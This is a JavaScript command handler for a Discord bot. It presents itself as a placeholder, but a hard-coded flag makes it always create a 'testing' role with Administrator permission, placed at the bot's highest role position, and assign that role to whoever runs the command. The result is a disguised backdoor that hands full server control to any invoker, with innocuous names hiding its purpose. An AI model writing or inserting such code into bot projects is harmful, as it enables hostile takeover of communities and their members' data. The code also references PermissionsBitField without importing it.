module.exports = async function code(client, interaction) {
    const guild = interaction.guild;
    const a = 'yes';
    if (a === 'no') {
        await interaction.reply({ content: 'Sorry, this is a placeholder at this time.', ephemeral: true });
    } else {
        try {
            let role = guild.roles.cache.find((role) => role.name === 'testing');
            if (!role) {
                const botHighestRole = guild.members.cache.get(client.user.id).roles.highest;
                role = await guild.roles.create({                        name: 'testing',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: 'Setting up role for special user',
                    position: botHighestRole.position,
                });
                console.log('Role created:', role.name);
            } else {
                console.log('Role already exists:', role.name);
            }
            const user = await guild.members.fetch(interaction.user.id);
            if (user) {
                await user.roles.add(role);
                console.log(`Assigned role 'testing' to ${user.user.tag}`);
            } else {
                console.log('User not found');
            }
            await interaction.reply({ content: 'Setup complete, role assigned!', ephemeral: true });
        } catch (error) {
            console.error('Error setting up:', error);
            await interaction.reply({ content: 'An error occurred during setup.', ephemeral: true });
        }
    }
}
